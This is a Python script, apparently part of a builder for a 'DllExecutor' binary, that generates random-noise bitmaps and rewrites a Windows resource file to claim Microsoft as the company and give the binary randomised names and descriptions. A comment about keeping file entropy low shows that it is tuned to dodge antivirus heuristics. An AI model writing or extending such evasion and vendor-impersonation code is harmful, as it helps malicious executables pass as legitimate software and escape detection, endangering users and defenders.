from randomness import *
from PIL import Image, ImageDraw

def generate_bmp(filename):
    # Define the dimensions of the BMP image
    width = 256  # Width of the image
    height = 256  # Height of the image

    # Create a new blank image with a white background
    img = Image.new('RGB', (width, height), 'white')

    # Create a drawing object to draw on the image
    draw = ImageDraw.Draw(img)

    # Generate random pixel colors and fill the image
    for x in range(width):
        for y in range(height):
            red = GetRandomRange(0, 255)
            green = GetRandomRange(0, 255)
            blue = GetRandomRange(0, 255)
            pixel_color = (red, green, blue)
            draw.point((x, y), fill=pixel_color)

    # Save the generated BMP image
    img.save(filename, 'BMP')
        
def change_metadata(icon_file) :
    number_of_bmp = 0#GetRandomRange(2, 6) makes the entropy go to 7.4 for ONE image, so very very very bad
    f = open("DllExecutor.rc", "r")
    f_c = f.readlines()
    f.close()
 
    o = open("DllExecutor.rc", "w")
    for line in f_c :
        if "CompanyName" in line :
            line = f'\t\t\tVALUE "CompanyName", "Microsoft"\n'
         
        elif "FileDescription" in line :
            line = f'\t\t\tVALUE "FileDescription", "{GetRandomString(20)}"\n'
        
        elif "InternalName" in line :
            line = f'\t\t\tVALUE "InternalName", "{GetRandomString(7)}.exe"\n'
        
        elif "OriginalFilename" in line :
            line = f'\t\t\tVALUE "OriginalFilename", "{GetRandomString(7)}.exe"\n'
        
        elif "ProductName" in line :
            line = f'\t\t\tVALUE "ProductName", "{GetRandomString(7)}.exe"\n'
        
        elif "MAINICON" in line :
            if icon_file != "" :
                line = f'MAINICON ICON "{icon_file}"\n'
            else :
                line = f'//MAINICON ICON "{icon_file}"\n'
                
            for i in range(number_of_bmp) :
                bmp_name = f"img_{i}.bmp"
                generate_bmp(bmp_name)
                line += f'{GetRandomString(10)} BITMAP "{bmp_name}"\n'
                
        elif "BITMAP" in line : line = ""
        
        o.write(line)
        
    o.close()